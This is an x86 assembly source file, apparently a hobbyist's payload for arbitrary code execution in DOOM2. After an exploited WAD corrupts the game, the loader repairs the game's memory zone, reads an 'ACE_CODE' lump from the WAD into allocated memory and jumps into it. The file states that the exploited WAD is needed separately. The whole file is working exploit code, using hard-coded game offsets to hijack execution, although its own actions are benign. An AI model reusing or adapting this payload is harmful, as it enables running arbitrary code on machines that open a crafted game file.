// kgsws' DOOM2 code execution
// - this code overwrote 64k chunk of original game code
// - this source only contains payload, you still need exploited WAD
//

#define TEXT_START	0x1000

.section .text
.globl _start

// Loaders purpose is
// - repair mainzone
// - allocate space for ACE_CODE
// - load ACE_CODE
// - run the code

_start:
	call	_main
_main:
	// get loader base
	pop	%esi
	sub	$(TEXT_START+5),%esi	// ESI will always point to loader base

	// get code base
	pop	%edi
	sub	$0x38CA5,%edi	// EDI will always point to code base

	// get data base
	mov	0x38C87(%edi),%ebp
	sub	$0x23a38,%ebp	// EBP will always point to data base

	// fix stack pointer
	pop	%esp

	// write intro text
	lea	logo_start(%esi),%edx
	mov	$(logo_end-logo_start),%ecx
	xor	%bx, %bx
	mov	$0x40,%ah
	int	$0x21

	// repair mainzone
	lea	zone_continue(%esi),%eax
	push	%eax
	sub	$12,%esp
	mov	0x74fe0(%ebp),%edx	// mainzone
	mov	(%edx),%eax	// size
	lea	0x395C6(%edi),%ecx
	jmp	*%ecx	// inside Z_Init
zone_continue:

	// get ACE_CODE lump
	lea	ace_code(%esi),%eax
	lea	0x38AF0(%edi),%ecx	// W_CheckNumForName
	call	*%ecx
	test	%eax,%eax
	jge	load_code

	// error text
	lea	ace_code_missing(%esi),%edx
	mov	$(ace_code_missing_e-ace_code_missing),%ecx
	xor	%bx, %bx
	mov	$0x40,%ah
	int	$0x21
	// exit to DOS
	mov	$0x4C00,%ax
	int	$0x21

load_code:
	// get ACE_CODE lumpinfo
	lea	0x0(,%eax,4),%edx
	add	%edx,%eax
	lea	0x0(,%eax,4),%ecx	// ECX will point to ACE_CODE lump info
	add	0x74fa4(%ebp),%ecx	// lumpinfo

	// seek to ACE_CODE in file
	push	%ecx
	mov	8(%ecx),%eax	// handle
	mov	12(%ecx),%edx	// offset
	xor	%ebx,%ebx	// SEEK_SET
	lea	0x408c0(%edi),%ecx	// seek
	call	*%ecx

	// read 4B from ACE_CODE
	mov	(%esp),%ecx
	mov	8(%ecx),%eax	// handle
	lea	logo_start(%esi),%edx	// reuse this memory
	mov	$4, %ebx	// sizeof(uint32_t)
	lea	0x40935(%edi),%ecx	// read
	call	*%ecx

	// allocate space for ACE_CODE and its .bss
	mov	(%esp),%ecx
	mov	16(%ecx),%eax	// ACE_CODE size
	add	logo_start(%esi),%eax	// + .bss size
	xor	%edx,%edx
	inc	%edx	// PU_STATIC
	xor	%ebx,%ebx // NULL
	lea	0x39690(%edi),%ecx	// Z_Malloc
	call	*%ecx	// if this fails, weird stuff happens; I_Error was trashed
	push	%eax

	// seek to ACE_CODE in file
	mov	4(%esp),%ecx
	mov	8(%ecx),%eax	// handle
	mov	12(%ecx),%edx	// offset
	xor	%ebx,%ebx	// SEEK_SET
	lea	0x408c0(%edi),%ecx	// seek
	call	*%ecx

	// read entire ACE_CODE
	mov	(%esp),%edx	// buffer
	mov	4(%esp),%ecx
	mov	8(%ecx),%eax	// handle
	mov	16(%ecx),%ebx	// size
	lea	0x40935(%edi),%ecx	// read
	call	*%ecx

	// text
	lea	ace_code_start(%esi),%edx
	mov	$(ace_code_end-ace_code_start),%ecx
	xor	%bx, %bx
	mov	$0x40,%ah
	int	$0x21

	// run the code
	pop	%eax	// ACE_CODE location
	pop	%ecx
	add	$4,%eax	// skip .bss size value
	jmp	*%eax

logo_start:
	.ascii "kgsws' loader is taking over ...\r\n"
	.byte 0x20, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xBB, 0x20, 0x20, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xBB
	.byte 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xBB, 0x0D, 0x0A, 0xDB, 0xDB, 0xC9, 0xCD, 0xCD, 0xDB
	.byte 0xDB, 0xBB, 0xDB, 0xDB, 0xC9, 0xCD, 0xCD, 0xCD, 0xCD, 0xBC, 0xDB, 0xDB, 0xC9, 0xCD, 0xCD, 0xCD
	.byte 0xCD, 0xBC, 0x0D, 0x0A, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xBA, 0xDB, 0xDB, 0xBA, 0x20
	.byte 0x20, 0x20, 0x20, 0x20, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xBB, 0x0D, 0x0A, 0xDB, 0xDB, 0xC9, 0xCD
	.byte 0xCD, 0xDB, 0xDB, 0xBA, 0xDB, 0xDB, 0xBA, 0x20, 0x20, 0x20, 0x20, 0x20, 0xDB, 0xDB, 0xC9, 0xCD
	.byte 0xCD, 0xBC, 0x0D, 0x0A, 0xDB, 0xDB, 0xBA, 0x20, 0x20, 0xDB, 0xDB, 0xBA, 0xC8, 0xDB, 0xDB, 0xDB
	.byte 0xDB, 0xDB, 0xDB, 0xBB, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xBB, 0x0D, 0x0A, 0xC8, 0xCD
	.byte 0xBC, 0x20, 0x20, 0xC8, 0xCD, 0xBC, 0x20, 0xC8, 0xCD, 0xCD, 0xCD, 0xCD, 0xCD, 0xBC, 0xC8, 0xCD
	.byte 0xCD, 0xCD, 0xCD, 0xCD, 0xCD, 0xBC, 0x0D, 0x0A
logo_end:
ace_code:
	.string "ACE_CODE"
ace_code_missing:
	.ascii "ERROR! Missing ACE_CODE!\r\n"
ace_code_missing_e:
ace_code_start:
	.ascii "Entering ACE_CODE ...\r\n"
ace_code_end:

